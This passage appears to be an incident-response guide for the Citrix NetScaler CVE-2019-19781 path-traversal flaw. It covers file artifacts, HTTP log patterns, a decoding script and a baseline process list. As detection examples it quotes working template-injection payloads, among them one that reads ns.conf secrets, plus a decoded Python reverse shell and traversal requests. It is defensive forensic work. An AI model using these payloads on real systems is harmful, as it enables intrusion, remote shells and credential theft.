
### Artifacts related to the exploit
Search for files created up to four days ago (when exploit became public)
```
root@ns# find /netscaler/portal/templates/ -mtime -4
/netscaler/portal/templates/brdluphxkv.xml
```

(Also check `/var/tmp/netscaler/portal/templates/`)

It is also possible to write the payload to execute into the actual filename with either a `POST` or `GET` request, so when searching logs, also look at `GET` requests.
```
-rw-r--r--   1 nobody  wheel    244 Nov 28 22:21 dddd[%template.new({'BLOCK'='print `id`'})%].xml
```
(credit: [@mpgn_x64](https://twitter.com/mpgn_x64/status/1216787131210829826)

Malicious template that has been observed that doesn't execute code. Here /nsconfig/ns.conf contains sensitive data.

```
<bookmark UI_inuse="" descr="b:" title="@FILE@[% USE mydata = datafile('/nsconfig/ns.conf', delim = '
') %][% FOREACH line = mydata %][% FOREACH value = line.values() %][% value %]@BR@[% END %] [% END %]@FILE@" url="http://
```
credit: [@msandbu](https://twitter.com/msandbu/status/1215959733900840963)

Look for webshells, e.g. php files (or any file modified in the last days) in any subdirectory under:
```
./var/netscaler/gui/
```

Backdoors are also being observed to be hidden in paths that can only be triggered with the path traversal vulnerability, so check in 

`/netscaler/portal/scripts/`

On my test instance these are the only valid perl scripts.
```
root@ns# ls -l /netscaler/portal/scripts/
total 24
-r-xr-xr-x  1 nobody  wheel  1618 Nov 28 19:45 PersonalBookmark.pl
-r-xr-xr-x  1 nobody  wheel   148 Nov 28 19:45 logout.pl
-r-xr-xr-x  1 nobody  wheel  1968 Nov 28 19:45 navthemes.pl
-r-xr-xr-x  1 nobody  wheel  3175 Nov 28 19:45 newbm.pl
-r-xr-xr-x  1 nobody  wheel   551 Nov 28 19:45 picktheme.pl
-r-xr-xr-x  1 nobody  wheel  2632 Nov 28 19:45 rmbm.pl
-r-xr-xr-x  1 nobody  wheel  2980 Nov 28 19:45 subscription.pl
-r-xr-xr-x  1 nobody  wheel  1965 Nov 28 19:45 themes.pl
-r-xr-xr-x  1 nobody  wheel   863 Nov 28 19:45 tips.pl
```

Note that timestamps can be modified with the `touch` command, so compare with the above and investigate any additional files.

### HTTP Logs

When looking at the logs there will be at minimum 2 HTTP requests, with the first being a `POST` or `GET` to a vulnerable perl script which includes the directory traversal in the path `'/../'`

The second will generally be a `GET` request to an XML file with a random name. 
Example from the 2nd released public exploit from [Trustedsec](https://github.com/trustedsec/cve-2019-19781/blob/master/citrixmash.py) (which invokes a reverse shell):

```
root@ns# tail -2 /var/log/httpaccess.log

192.168.0.4 - - [28/Nov/2019:22:28:20 +0000] "POST /vpns/portal/scripts/newbm.pl HTTP/1.1" 200 135 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0" "Time: 6809 microsecs"

192.168.0.4 - - [28/Nov/2019:22:28:22 +0000] "GET /vpns/portal/xbtewgybbp.xml HTTP/1.1" 200 696 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0" "Time: 147744 microsecs"
```

This specific exploit encodes the payload into character codes. If you see something like this in the template you can decode it :
```
    <bookmark UI_inuse="a" descr="desc" title="[% template.new({'BLOCK'='print readpipe(chr(47) . chr(118) . chr(97) . chr(114) . chr(47) . chr(112) . chr(121) . chr(116) . chr(104) . chr(111) . chr(110
```

Paste the whole template file into a text file `payload.txt` :

```
$ python decode.py payload.txt 
/var/python/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.4",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Here is a quick and dirty decoding script:
```
$ cat decode.py 
import re
import sys

if len(sys.argv) != 2 :
   print "usage: ./decode.py payload.txt"
   sys.exit(1)

f = open(sys.argv[1])
l = [b.rstrip() for b in f.readlines()]
j = "".join(l)
f.close()
a = re.search(r'.*readpipe\((.*)\)\'.*', j)
if a is None :
   print "Can't find encoded payload"
   os.Exit(1)

payload = ""
for i in a.group(1).split('.') :
   c = re.search(r'chr\((\d+)\)',i)
   if c is not None :
      k = int(c.group(1))
      payload = payload + str(chr(k))
print payload
```


### Processes

#### Default processes
Citrix Gateway VPX for ESX Build 13.0-47.22

```
USER        PID %CPU %MEM   VSZ   RSS  TT  STAT STARTED      TIME COMMAND
root         11 100.0  0.0     0    32  ??  RL    7:59PM  27:45.13 [idle]
root       1202 98.7 32.2 523996 524176  ??  Rs    7:59PM  39:46.59 nsppe (NSPPE-00)
root       1204  0.6  1.1 31744 17344  ??  Rs    7:59PM   2:00.52 /netscaler/nsnetsvc -S -C
root          0  0.0  0.0     0   704  ??  DLs   7:59PM   0:00.17 [kernel]
root          1  0.0  0.0  3204   428  ??  ILs   7:59PM   0:00.03 /sbin/init --
root          2  0.0  0.0     0    16  ??  DL    7:59PM   0:00.02 [g_event]
root          3  0.0  0.0     0    16  ??  DL    7:59PM   0:00.24 [g_up]
root          4  0.0  0.0     0    16  ??  DL    7:59PM   0:00.39 [g_down]
root          5  0.0  0.0     0    16  ??  DL    7:59PM   0:00.00 [crypto]
root          6  0.0  0.0     0    16  ??  DL    7:59PM   0:00.00 [crypto returns]
root          7  0.0  0.0     0    16  ??  DL    7:59PM   0:00.00 [mpt_recovery0]
root          8  0.0  0.0     0    16  ??  DL    7:59PM   0:00.00 [sctp_iterator]
root          9  0.0  0.0     0    16  ??  DL    7:59PM   0:00.00 [xpt_thrd]
root         10  0.0  0.0     0    16  ??  DL    7:59PM   0:00.00 [audit]
root         12  0.0  0.0     0   224  ??  WL    7:59PM   5:51.55 [intr]
root         13  0.0  0.0     0    16  ??  DL    7:59PM   0:08.13 [yarrow]
root         14  0.0  0.0     0    16  ??  DL    7:59PM   0:07.38 [gv_worker]
root         15  0.0  0.0     0    16  ??  DL    7:59PM   0:00.30 [md0]
root         16  0.0  0.0     0    16  ??  DL    7:59PM   0:00.16 [pagedaemon]
root         17  0.0  0.0     0    16  ??  DL    7:59PM   0:00.00 [vmdaemon]
root         18  0.0  0.0     0    16  ??  DL    7:59PM   0:00.00 [pagezero]
root         19  0.0  0.0     0    16  ??  SL    7:59PM   0:00.04 [nsidler]
root         20  0.0  0.0     0    16  ??  DL    7:59PM   0:00.48 [bufdaemon]
root         21  0.0  0.0     0    16  ??  DL    7:59PM   0:01.10 [syncer]
root         22  0.0  0.0     0    16  ??  DL    7:59PM   0:00.80 [vnlru]
root         23  0.0  0.0     0    16  ??  DL    7:59PM   0:00.81 [softdepflush]
root         24  0.0  0.7 10624 10676  ??  S     7:59PM   0:02.26 nspitboss (pitboss)
root        958  0.0  0.1  6896  1204  ??  Ss    7:59PM   0:00.14 /usr/sbin/syslogd -b 127.0.0.1 -n -v -v -8 -C
root        960  0.0  0.1  9008  1168  ??  Is    7:59PM   0:00.00 /usr/sbin/inetd
root        962  0.0  0.1  7952  1220  ??  Ss    7:59PM   0:00.05 /usr/sbin/cron
root        966  0.0  1.5 110392 23868  ??  Ss    7:59PM   0:01.12 /bin/httpd
root        969  0.0  0.1 10196  2376  ??  I     7:59PM   0:00.17 /usr/local/bin/monit -c /etc/monitrc
root        972  0.0  0.2 19104  3340  ??  Ss    7:59PM   0:00.00 /usr/sbin/sshd -f /etc/sshd_config
nobody     1012  0.0  2.1 128964 34780  ??  I     7:59PM   0:00.38 /bin/httpd
nobody     1013  0.0  2.2 128964 35344  ??  I     7:59PM   0:03.47 /bin/httpd
nobody     1014  0.0  2.1 128964 35012  ??  I     7:59PM   0:00.25 /bin/httpd
nobody     1015  0.0  2.1 128964 34764  ??  I     7:59PM   0:00.23 /bin/httpd
nobody     1016  0.0  2.0 128964 33232  ??  I     7:59PM   0:00.14 /bin/httpd
root       1201  0.0  0.2 12648  4060  ??  Ss    7:59PM   0:00.28 nslped
root       1225  0.0  0.2 10868  2852  ??  Ss    7:59PM   0:00.03 /netscaler/nsmap -l
root       1226  0.0  0.8 33360 12556  ??  Ss    7:59PM   0:28.85 /netscaler/nsaggregatord
root       1227  0.0  0.2 76228  3788  ??  Ss    7:59PM   0:03.39 /netscaler/nsclusterd
root       1228  0.0  0.2 10624  3020  ??  Ss    7:59PM   0:00.17 /netscaler/monuploadd
root       1250  0.0  1.0 30968 16780  ??  Ss    7:59PM   0:00.48 /netscaler/nsconfigd -S
root       1252  0.0  1.2 44996 19876  ??  S     7:59PM   0:02.89 /netscaler/nsgslbautosync
root       1255  0.0  0.2 10620  2976  ??  Ss    7:59PM   0:00.03 /netscaler/nsfsyncd -d
root       1263  0.0  0.3 11164  5072  ??  Ss    7:59PM   0:00.18 /netscaler/imi -d
root       1270  0.0  0.2 16072  2508  ??  Is    7:59PM   0:00.00 /netscaler/nscrlrefresh
root       1279  0.0  0.8 43720 12508  ??  S     7:59PM   0:01.16 php /netscaler/websocketd/websocket-ssh-deamon.php
root       1293  0.0  0.1 10132  1392  ??  Is    7:59PM   0:00.00 /netscaler/nskrb nsauth
root       1294  0.0  0.1  6016  1764  ??  I     7:59PM   0:00.00 /netscaler/nsvpnd 7776
root       1295  0.0  0.7 53940 11468  ??  I     7:59PM   0:00.24 /netscaler/nsaaad -n 10 -p 8766
root       1297  0.0  0.2  6016  2696  ??  S     7:59PM   0:00.49 /netscaler/nsvpnd 7776
root       1301  0.0  0.2  7436  3220  ??  S     7:59PM   0:00.33 /netscaler/iked
root       1305  0.0  0.4 15756  6020  ??  S     7:59PM   0:00.56 /netscaler/aslearn -start -f /netscaler/aslearn.conf
root       1310  0.0  0.4 18148  5972  ??  Ss    7:59PM   0:00.56 /netscaler/nsclfsyncd -s
root       1312  0.0  0.4 27044  6428  ??  S     7:59PM   0:01.79 /netscaler/snmpd
root       1314  0.0  0.3 14160  5404  ??  Ss    7:59PM   0:00.43 /netscaler/provserverd -S
root       1317  0.0  0.5 18228  7696  ??  Rs    7:59PM   1:43.34 /netscaler/nsrised -S
root       1319  0.0  0.1  8320  1516  ??  I     7:59PM   0:00.00 sh /netscaler/nssync.sh start
root       1325  0.0  0.6 28904  9552  ??  Ss    7:59PM   0:00.40 /netscaler/nscfsyncd -s
root       1332  0.0  0.1  7920  2432  ??  Ss    7:59PM   0:00.18 /netscaler/syshealthd
root       1333  0.0  0.1  5800   940  ??  Ss    7:59PM   0:00.02 /netscaler/nscac64p
root       1335  0.0  1.9 57572 30776  ??  I     7:59PM   0:00.16 /netscaler/nscollect start
root       1336  0.0  1.9 57572 30796  ??  I     7:59PM   0:00.20 /netscaler/nscollect aggmode
root       1338  0.0  0.1  8320  2364  ??  I     7:59PM   0:00.11 /usr/bin/bash /netscaler/nsproflog.sh cpuuse=900 start
root       1344  0.0  0.4 26132  6792  ??  Ss    7:59PM   0:22.77 /netscaler/metricscollector
root       1345  0.0  0.1  8264  2032  ??  I     7:59PM   0:00.01 /netscaler/datadaemon
root       1354  0.0  0.4 30980  5796  ??  Ss    7:59PM   0:00.09 /netscaler/nscopo -vv -p
root       1355  0.0  0.7 21068 11332  ??  Ss    7:59PM   0:00.57 /netscaler/nstraceaggregator
root       1377  0.0  0.4 18060  5816  ??  I     7:59PM   0:00.01 /netscaler/nssync
root       1430  0.0  0.1  1532   984  ??  Ss    7:59PM   0:01.30 /netscaler/nsprofmgmt 90.0
root       1459  0.0  0.2 18400  3512  ??  S     7:59PM   0:54.10 /netscaler/nsprofmon -s cpu=1 -ys cpuuse=900 -ys profmode=cpuuse -O -k /var/nsproflog/newproflog_cpu_1.out -s logsize=10485760 -ye capture
nsmonitor  1462  0.0  0.2 10620  2876  ??  Ss    7:59PM   0:00.54 /netscaler/nsumond
nobody     1495  0.0  1.7 110456 27468  ??  I     7:59PM   0:00.07 /bin/httpd
root       1524  0.0  0.1  6892  1132  ??  S     8:00PM   0:00.01 /usr/libexec/getty std.9600 ttyu0
root       2228  0.0  0.0  2736   728  ??  I     8:38PM   0:00.00 sleep 60
root       2241  0.0  0.3 19104  4084  ??  Ss    8:38PM   0:00.05 sshd: nsroot@pts/0 (sshd)
root       1516  0.0  0.1  6892  1088  v0  Is+   8:00PM   0:00.00 /usr/libexec/getty Pc ttyv0
root       1517  0.0  0.1  6892  1088  v1  Is+   8:00PM   0:00.00 /usr/libexec/getty Pc ttyv1
root       1518  0.0  0.1  6892  1088  v2  Is+   8:00PM   0:00.00 /usr/libexec/getty Pc ttyv2
root       1519  0.0  0.1  6892  1088  v3  Is+   8:00PM   0:00.00 /usr/libexec/getty Pc ttyv3
root       1520  0.0  0.1  6892  1088  v4  Is+   8:00PM   0:00.00 /usr/libexec/getty Pc ttyv4
root       1521  0.0  0.1  6892  1088  v5  Is+   8:00PM   0:00.00 /usr/libexec/getty Pc ttyv5
root       1522  0.0  0.1  6892  1088  v6  Is+   8:00PM   0:00.00 /usr/libexec/getty Pc ttyv6
root       1523  0.0  0.1  6892  1088  v7  Is+   8:00PM   0:00.00 /usr/libexec/getty Pc ttyv7
root       2247  0.0  0.5 18060  8016   0  Ss    8:39PM   0:00.11 nscli

```
